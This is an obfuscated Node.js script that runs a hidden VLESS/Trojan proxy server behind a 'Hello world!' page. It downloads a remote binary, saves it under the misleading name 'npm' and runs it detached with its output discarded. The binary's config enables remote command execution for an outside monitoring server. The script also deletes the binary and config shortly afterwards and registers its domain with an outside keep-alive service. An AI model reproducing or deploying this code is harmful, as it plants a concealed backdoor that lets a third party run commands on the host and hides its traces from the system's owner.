function _0x25cc(){const _0x3d853b=['setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','http','https://oooo.serv00.net/add-url','error:\x20','reduce','arch','AUTO_ACCESS','DOMAIN','text/html','utf8','https://','NEZHA_SERVER','utf-8','https://arm64.ssss.nyc.mn/v1','map','695010KkZncN','2053','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','createServer','writeFileSync','concat','PORT','npm\x20is\x20already\x20running,\x20skip\x20running...','connect','2096','/bin/bash','buffer','once','161133RRUQzF','client_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','then','--tls','url','Unknown','npm\x20is\x20running','readUInt8','WSPATH','31704450wBPaQr','&fp=chrome&type=ws&host=','NEZHA_PORT','arm','https://dns.google/resolve?name=','message','Answer','trim','https://amd64.ssss.nyc.mn/agent','slice','config.yaml','Server\x20is\x20running\x20on\x20port\x20','join','Failed\x20to\x20resolve\x20','pop','NEZHA_KEY','hex','stream','send','8.8.4.4','sha224','finish','writeHead',':443?encryption=none&security=tls&sni=','&path=%2F','aarch64','includes','pipe','951085VYcsBJ','true','17160ltJkJy','close','4302aVsmPj','test','unlink','get','catch','every','443','chmod\x20+x\x20npm','Hello\x20world!','decode','createWriteStream','2087','write','split','false','country','&type=A','toString','929006qWCCwn','type','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','substr','readFile','path','\x20-p\x20','1874252uaXGqh','arm64','Hug','1.1.1.1','npm','application/json','https://arm64.ssss.nyc.mn/agent','sub','https://amd64.ssss.nyc.mn/v1','1234.abc.com','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','log','text/plain','7eNIFPa','\x20with\x20all\x20DNS\x20servers','9cOhOgC','crypto','trojan://','readUInt16BE','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8443','env','asOrganization','Server','end','error','length','npm\x20download\x20successfully','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','post','setsid\x20nohup\x20./npm\x20-s\x20'];_0x25cc=function(){return _0x3d853b;};return _0x25cc();}const _0x368169=_0xddc3;(function(_0x363c11,_0x3d4973){const _0x1bd7b3=_0xddc3,_0x4e1d0d=_0x363c11();while(!![]){try{const _0x25ca7c=-parseInt(_0x1bd7b3(0x16d))/0x1+parseInt(_0x1bd7b3(0x1a9))/0x2+parseInt(_0x1bd7b3(0x1bf))/0x3*(-parseInt(_0x1bd7b3(0x1b0))/0x4)+-parseInt(_0x1bd7b3(0x193))/0x5+parseInt(_0x1bd7b3(0x160))/0x6*(parseInt(_0x1bd7b3(0x1bd))/0x7)+-parseInt(_0x1bd7b3(0x195))/0x8*(parseInt(_0x1bd7b3(0x197))/0x9)+parseInt(_0x1bd7b3(0x177))/0xa;if(_0x25ca7c===_0x3d4973)break;else _0x4e1d0d['push'](_0x4e1d0d['shift']());}catch(_0x4c1069){_0x4e1d0d['push'](_0x4e1d0d['shift']());}}}(_0x25cc,0xec6f2));const os=require('os'),http=require(_0x368169(0x152)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x368169(0x1ae)),crypto=require(_0x368169(0x1c0)),{Buffer}=require(_0x368169(0x16b)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x368169(0x146)]['UUID']||'2584b733-9095-4bec-a7d5-62b473540f7a',NEZHA_SERVER=process['env'][_0x368169(0x15c)]||'',NEZHA_PORT=process['env'][_0x368169(0x179)]||'',NEZHA_KEY=process[_0x368169(0x146)][_0x368169(0x186)]||'',DOMAIN=process[_0x368169(0x146)][_0x368169(0x158)]||_0x368169(0x1b9),AUTO_ACCESS=process[_0x368169(0x146)][_0x368169(0x157)]||!![],WSPATH=process['env'][_0x368169(0x176)]||UUID[_0x368169(0x180)](0x0,0x8),SUB_PATH=process[_0x368169(0x146)]['SUB_PATH']||_0x368169(0x1b7),NAME=process['env']['NAME']||_0x368169(0x1b2),PORT=process[_0x368169(0x146)][_0x368169(0x166)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5dcb24=_0x368169;try{const _0x15dced=await axios['get']('https://speed.cloudflare.com/meta'),_0x315748=_0x15dced[_0x5dcb24(0x14d)];ISP=(_0x315748[_0x5dcb24(0x1a6)]+'-'+_0x315748[_0x5dcb24(0x147)])['replace'](/ /g,'_');}catch(_0x13d441){ISP=_0x5dcb24(0x173);}};GetISP();function _0xddc3(_0x74c4b1,_0x1a3b32){const _0x25cc31=_0x25cc();return _0xddc3=function(_0xddc3d8,_0x3b7cc9){_0xddc3d8=_0xddc3d8-0x145;let _0x2d21b0=_0x25cc31[_0xddc3d8];return _0x2d21b0;},_0xddc3(_0x74c4b1,_0x1a3b32);}const httpServer=http[_0x368169(0x163)]((_0x5bac14,_0xf06ada)=>{const _0x2bc8ad=_0x368169;if(_0x5bac14[_0x2bc8ad(0x172)]==='/'){const _0x3b240e=path['join'](__dirname,'index.html');fs[_0x2bc8ad(0x1ad)](_0x3b240e,_0x2bc8ad(0x15a),(_0x2b0fe5,_0x2f0cae)=>{const _0x4d21c9=_0x2bc8ad;if(_0x2b0fe5){_0xf06ada[_0x4d21c9(0x18d)](0xc8,{'Content-Type':'text/html'}),_0xf06ada[_0x4d21c9(0x149)](_0x4d21c9(0x19f));return;}_0xf06ada[_0x4d21c9(0x18d)](0xc8,{'Content-Type':_0x4d21c9(0x159)}),_0xf06ada['end'](_0x2f0cae);});return;}else{if(_0x5bac14[_0x2bc8ad(0x172)]==='/'+SUB_PATH){const _0xfbfa8f='vless://'+UUID+'@'+DOMAIN+_0x2bc8ad(0x18e)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2bc8ad(0x18f)+WSPATH+'#'+NAME+'-'+ISP,_0x3e5eb7=_0x2bc8ad(0x1c1)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x2bc8ad(0x178)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x341970=_0xfbfa8f+'\x0a'+_0x3e5eb7,_0x2f638b=Buffer['from'](_0x341970)[_0x2bc8ad(0x1a8)]('base64');_0xf06ada[_0x2bc8ad(0x18d)](0xc8,{'Content-Type':'text/plain'}),_0xf06ada[_0x2bc8ad(0x149)](_0x2f638b+'\x0a');}else _0xf06ada['writeHead'](0x194,{'Content-Type':_0x2bc8ad(0x1bc)}),_0xf06ada[_0x2bc8ad(0x149)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x368169(0x148))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x368169(0x18a),_0x368169(0x1b3)];function resolveHost(_0x5e19b5){return new Promise((_0x25abb7,_0x2a62be)=>{const _0x51bcb0=_0xddc3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x51bcb0(0x198)](_0x5e19b5)){_0x25abb7(_0x5e19b5);return;}let _0xfd64a4=0x0;function _0xf50e25(){const _0x1c024c=_0x51bcb0;if(_0xfd64a4>=DNS_SERVERS[_0x1c024c(0x14b)]){_0x2a62be(new Error(_0x1c024c(0x184)+_0x5e19b5+_0x1c024c(0x1be)));return;}const _0x616fb6=DNS_SERVERS[_0xfd64a4];_0xfd64a4++;const _0x346bb9=_0x1c024c(0x17b)+encodeURIComponent(_0x5e19b5)+_0x1c024c(0x1a7);axios['get'](_0x346bb9,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x1c024c(0x170)](_0x26ae2f=>{const _0x2417a8=_0x1c024c,_0x46b1d4=_0x26ae2f['data'];if(_0x46b1d4['Status']===0x0&&_0x46b1d4[_0x2417a8(0x17d)]&&_0x46b1d4[_0x2417a8(0x17d)][_0x2417a8(0x14b)]>0x0){const _0x4382a9=_0x46b1d4[_0x2417a8(0x17d)]['find'](_0x1317fc=>_0x1317fc[_0x2417a8(0x1aa)]===0x1);if(_0x4382a9){_0x25abb7(_0x4382a9[_0x2417a8(0x14d)]);return;}}_0xf50e25();})[_0x1c024c(0x19b)](_0x23ec8f=>{_0xf50e25();});}_0xf50e25();});}function handleVlessConnection(_0x196111,_0x5e6a16){const _0x51b6c8=_0x368169,[_0x34280f]=_0x5e6a16,_0x4b3c76=_0x5e6a16['slice'](0x1,0x11);if(!_0x4b3c76[_0x51b6c8(0x19c)]((_0x4f4af7,_0x3fb47e)=>_0x4f4af7==parseInt(uuid[_0x51b6c8(0x1ac)](_0x3fb47e*0x2,0x2),0x10)))return![];let _0x33900c=_0x5e6a16[_0x51b6c8(0x180)](0x11,0x12)[_0x51b6c8(0x175)]()+0x13;const _0x3036bb=_0x5e6a16['slice'](_0x33900c,_0x33900c+=0x2)[_0x51b6c8(0x1c2)](0x0),_0x4e73d3=_0x5e6a16[_0x51b6c8(0x180)](_0x33900c,_0x33900c+=0x1)['readUInt8'](),_0x4347f6=_0x4e73d3==0x1?_0x5e6a16[_0x51b6c8(0x180)](_0x33900c,_0x33900c+=0x4)['join']('.'):_0x4e73d3==0x2?new TextDecoder()[_0x51b6c8(0x1a0)](_0x5e6a16['slice'](_0x33900c+0x1,_0x33900c+=0x1+_0x5e6a16[_0x51b6c8(0x180)](_0x33900c,_0x33900c+0x1)[_0x51b6c8(0x175)]())):_0x4e73d3==0x3?_0x5e6a16['slice'](_0x33900c,_0x33900c+=0x10)[_0x51b6c8(0x155)]((_0x14a912,_0x5b0d1e,_0x4e2cb6,_0x15dcd2)=>_0x4e2cb6%0x2?_0x14a912[_0x51b6c8(0x165)](_0x15dcd2['slice'](_0x4e2cb6-0x1,_0x4e2cb6+0x1)):_0x14a912,[])[_0x51b6c8(0x15f)](_0x493a5d=>_0x493a5d[_0x51b6c8(0x1c2)](0x0)[_0x51b6c8(0x1a8)](0x10))[_0x51b6c8(0x183)](':'):'';_0x196111[_0x51b6c8(0x189)](new Uint8Array([_0x34280f,0x0]));const _0x3a0571=createWebSocketStream(_0x196111);return resolveHost(_0x4347f6)[_0x51b6c8(0x170)](_0x155f2b=>{const _0x293743=_0x51b6c8;net[_0x293743(0x168)]({'host':_0x155f2b,'port':_0x3036bb},function(){const _0x2a31e3=_0x293743;this[_0x2a31e3(0x1a3)](_0x5e6a16['slice'](_0x33900c)),_0x3a0571['on'](_0x2a31e3(0x14a),()=>{})[_0x2a31e3(0x192)](this)['on'](_0x2a31e3(0x14a),()=>{})[_0x2a31e3(0x192)](_0x3a0571);})['on']('error',()=>{});})[_0x51b6c8(0x19b)](_0x4ffa4f=>{const _0x59082e=_0x51b6c8;net[_0x59082e(0x168)]({'host':_0x4347f6,'port':_0x3036bb},function(){const _0x2d1f2f=_0x59082e;this[_0x2d1f2f(0x1a3)](_0x5e6a16[_0x2d1f2f(0x180)](_0x33900c)),_0x3a0571['on'](_0x2d1f2f(0x14a),()=>{})['pipe'](this)['on']('error',()=>{})[_0x2d1f2f(0x192)](_0x3a0571);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x5e490b,_0x18904b){const _0x12485c=_0x368169;try{if(_0x18904b[_0x12485c(0x14b)]<0x3a)return![];const _0x479df3=_0x18904b['slice'](0x0,0x38)[_0x12485c(0x1a8)](),_0x1ce779=[UUID];let _0x58c907=null;for(const _0xdd731a of _0x1ce779){const _0x2d8fc8=crypto['createHash'](_0x12485c(0x18b))['update'](_0xdd731a)['digest'](_0x12485c(0x187));if(_0x2d8fc8===_0x479df3){_0x58c907=_0xdd731a;break;}}if(!_0x58c907)return![];let _0x4fb10f=0x38;_0x18904b[_0x4fb10f]===0xd&&_0x18904b[_0x4fb10f+0x1]===0xa&&(_0x4fb10f+=0x2);const _0x5a32f4=_0x18904b[_0x4fb10f];if(_0x5a32f4!==0x1)return![];_0x4fb10f+=0x1;const _0x2de943=_0x18904b[_0x4fb10f];_0x4fb10f+=0x1;let _0x4350e5,_0x261ace;if(_0x2de943===0x1)_0x4350e5=_0x18904b['slice'](_0x4fb10f,_0x4fb10f+0x4)[_0x12485c(0x183)]('.'),_0x4fb10f+=0x4;else{if(_0x2de943===0x3){const _0x22f157=_0x18904b[_0x4fb10f];_0x4fb10f+=0x1,_0x4350e5=_0x18904b['slice'](_0x4fb10f,_0x4fb10f+_0x22f157)[_0x12485c(0x1a8)](),_0x4fb10f+=_0x22f157;}else{if(_0x2de943===0x4)_0x4350e5=_0x18904b[_0x12485c(0x180)](_0x4fb10f,_0x4fb10f+0x10)['reduce']((_0xf32f9b,_0x29a08a,_0x8a0793,_0x40d215)=>_0x8a0793%0x2?_0xf32f9b[_0x12485c(0x165)](_0x40d215[_0x12485c(0x180)](_0x8a0793-0x1,_0x8a0793+0x1)):_0xf32f9b,[])[_0x12485c(0x15f)](_0x3fd271=>_0x3fd271[_0x12485c(0x1c2)](0x0)[_0x12485c(0x1a8)](0x10))[_0x12485c(0x183)](':'),_0x4fb10f+=0x10;else return![];}}_0x261ace=_0x18904b['readUInt16BE'](_0x4fb10f),_0x4fb10f+=0x2;_0x4fb10f<_0x18904b[_0x12485c(0x14b)]&&_0x18904b[_0x4fb10f]===0xd&&_0x18904b[_0x4fb10f+0x1]===0xa&&(_0x4fb10f+=0x2);const _0x542f63=createWebSocketStream(_0x5e490b);return resolveHost(_0x4350e5)['then'](_0x12fce8=>{net['connect']({'host':_0x12fce8,'port':_0x261ace},function(){const _0x206dde=_0xddc3;_0x4fb10f<_0x18904b[_0x206dde(0x14b)]&&this['write'](_0x18904b['slice'](_0x4fb10f)),_0x542f63['on'](_0x206dde(0x14a),()=>{})[_0x206dde(0x192)](this)['on'](_0x206dde(0x14a),()=>{})[_0x206dde(0x192)](_0x542f63);})['on']('error',()=>{});})[_0x12485c(0x19b)](_0x29f60c=>{const _0x4fa394=_0x12485c;net[_0x4fa394(0x168)]({'host':_0x4350e5,'port':_0x261ace},function(){const _0x367f3f=_0x4fa394;_0x4fb10f<_0x18904b[_0x367f3f(0x14b)]&&this[_0x367f3f(0x1a3)](_0x18904b[_0x367f3f(0x180)](_0x4fb10f)),_0x542f63['on'](_0x367f3f(0x14a),()=>{})[_0x367f3f(0x192)](this)['on'](_0x367f3f(0x14a),()=>{})[_0x367f3f(0x192)](_0x542f63);})['on']('error',()=>{});}),!![];}catch(_0x31f239){return![];}}wss['on']('connection',(_0x1795c2,_0x18a430)=>{const _0xaa5f9=_0x368169,_0x551286=_0x18a430[_0xaa5f9(0x172)]||'';_0x1795c2[_0xaa5f9(0x16c)](_0xaa5f9(0x17c),_0x4e10e1=>{const _0x5b9076=_0xaa5f9;if(_0x4e10e1[_0x5b9076(0x14b)]>0x11&&_0x4e10e1[0x0]===0x0){const _0xd07032=_0x4e10e1[_0x5b9076(0x180)](0x1,0x11),_0x1a0884=_0xd07032[_0x5b9076(0x19c)]((_0x563c01,_0x283498)=>_0x563c01==parseInt(uuid[_0x5b9076(0x1ac)](_0x283498*0x2,0x2),0x10));if(_0x1a0884){!handleVlessConnection(_0x1795c2,_0x4e10e1)&&_0x1795c2['close']();return;}}!handleTrojanConnection(_0x1795c2,_0x4e10e1)&&_0x1795c2[_0x5b9076(0x196)]();})['on'](_0xaa5f9(0x14a),()=>{});});const getDownloadUrl=()=>{const _0x1a835d=_0x368169,_0x308b1f=os[_0x1a835d(0x156)]();return _0x308b1f===_0x1a835d(0x17a)||_0x308b1f===_0x1a835d(0x1b1)||_0x308b1f===_0x1a835d(0x190)?!NEZHA_PORT?_0x1a835d(0x15e):_0x1a835d(0x1b6):!NEZHA_PORT?_0x1a835d(0x1b8):_0x1a835d(0x17f);},downloadFile=async()=>{const _0x48f147=_0x368169;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x134941=getDownloadUrl(),_0x4d315c=await axios({'method':_0x48f147(0x19a),'url':_0x134941,'responseType':_0x48f147(0x188)}),_0x919da4=fs[_0x48f147(0x1a1)](_0x48f147(0x1b4));return _0x4d315c['data'][_0x48f147(0x192)](_0x919da4),new Promise((_0x296efe,_0xa1e43f)=>{const _0x45956b=_0x48f147;_0x919da4['on'](_0x45956b(0x18c),()=>{const _0x2e8d09=_0x45956b;console[_0x2e8d09(0x1bb)](_0x2e8d09(0x14c)),exec(_0x2e8d09(0x19e),_0x3f9075=>{if(_0x3f9075)_0xa1e43f(_0x3f9075);_0x296efe();});}),_0x919da4['on'](_0x45956b(0x14a),_0xa1e43f);});}catch(_0x50f566){throw _0x50f566;}},runnz=async()=>{const _0x33f94c=_0x368169;try{const _0x17126f=execSync(_0x33f94c(0x1ab),{'encoding':_0x33f94c(0x15d)});if(_0x17126f[_0x33f94c(0x17e)]()!==''){console['log'](_0x33f94c(0x167));return;}}catch(_0x3facba){}await downloadFile();let _0x2eeca3='',_0x3ee6c9=[_0x33f94c(0x19d),_0x33f94c(0x145),_0x33f94c(0x169),_0x33f94c(0x1a2),'2083',_0x33f94c(0x161)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x46276e=_0x3ee6c9['includes'](NEZHA_PORT)?_0x33f94c(0x171):'';_0x2eeca3=_0x33f94c(0x150)+NEZHA_SERVER+':'+NEZHA_PORT+_0x33f94c(0x1af)+NEZHA_KEY+'\x20'+_0x46276e+_0x33f94c(0x1ba);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4282fd=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x33f94c(0x1a4)](':')[_0x33f94c(0x185)]():'',_0x24110f=_0x3ee6c9[_0x33f94c(0x191)](_0x4282fd)?_0x33f94c(0x194):_0x33f94c(0x1a5),_0x2680ff=_0x33f94c(0x16e)+NEZHA_KEY+_0x33f94c(0x16f)+NEZHA_SERVER+_0x33f94c(0x14e)+_0x24110f+_0x33f94c(0x1c3)+UUID;fs[_0x33f94c(0x164)](_0x33f94c(0x181),_0x2680ff);}_0x2eeca3=_0x33f94c(0x151);}else{console[_0x33f94c(0x1bb)](_0x33f94c(0x162));return;}}try{exec(_0x2eeca3,{'shell':_0x33f94c(0x16a)},_0x14f05f=>{const _0x1ac757=_0x33f94c;if(_0x14f05f)console['error']('npm\x20running\x20error:',_0x14f05f);else console['log'](_0x1ac757(0x174));});}catch(_0x1229f5){console[_0x33f94c(0x14a)](_0x33f94c(0x154)+_0x1229f5);}};async function addAccessTask(){const _0x2cdaaf=_0x368169;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4ef94e=_0x2cdaaf(0x15b)+DOMAIN;try{const _0xa59571=await axios[_0x2cdaaf(0x14f)](_0x2cdaaf(0x153),{'url':_0x4ef94e},{'headers':{'Content-Type':_0x2cdaaf(0x1b5)}});console[_0x2cdaaf(0x1bb)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x144c11){}}const delFiles=()=>{const _0x28c3e1=_0x368169;fs[_0x28c3e1(0x199)](_0x28c3e1(0x1b4),()=>{}),fs[_0x28c3e1(0x199)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x517358=_0x368169;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x517358(0x182)+PORT);});
